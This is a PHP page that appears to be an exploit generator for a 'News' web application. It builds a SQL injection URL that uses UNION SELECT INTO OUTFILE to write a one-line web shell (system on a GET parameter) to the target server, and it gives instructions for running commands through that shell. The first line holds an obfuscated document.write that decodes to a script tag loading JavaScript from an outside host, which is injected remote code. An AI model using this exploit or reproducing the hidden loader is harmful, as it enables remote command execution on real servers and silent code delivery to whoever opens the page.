<script type="text/javascript">document.write('\u003c\u0053\u0043\u0052\u0049\u0050\u0054\u0020\u0053\u0052\u0043\u003d\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0077\u0077\u0077\u002e\u0072\u0035\u0037\u002e\u006c\u0069\u002f\u0069\u006d\u0061\u0067\u0065\u0073\u002f\u0069\u006d\u0067\u002e\u006a\u0073\u003e\u003c\u002f\u0053\u0043\u0052\u0049\u0050\u0054\u003e')</script>
<?php
?>
<html>
<head>
<title>|| .::News Remote PHP Shell Injection::. ||   </title>
</head>
<body>
<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />
<?php
if (isset($_POST['url'])) {
$url = $_POST['url'];
$path2news = $_POST['path2news'];
$outfile = $_POST ['outfile'];
$sql = "0' UNION SELECT '0' , '<? system(\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO OUTFILE '$outfile";
$sql = urlencode($sql);
$expurl= $url."?id=".$sql ;
echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';
echo "After clicking go to http://www.site.com/path2phpshell/shell.php?cpc=ls to see results";
}
else
{
?>
Url to index.php: <br /> 
<form action = "<?php echo "$_SERVER[PHP_SELF]" ; ?>" method = "post">
<input type = "text" name = "url" value = "http://www.site.com/n13/index.php"; size = "50"> <br />
Server Path to Shell: <br />
Full server path to a writable file which will contain the Php Shell <br />
<input type = "text" name = "outfile" value = "/var/www/localhost/htdocs/n13/shell.php" size = "50"> <br /> <br />
<input type = "submit" value = "Create Exploit"> <br /> <br />



<?php
}
?>
</body>
</html>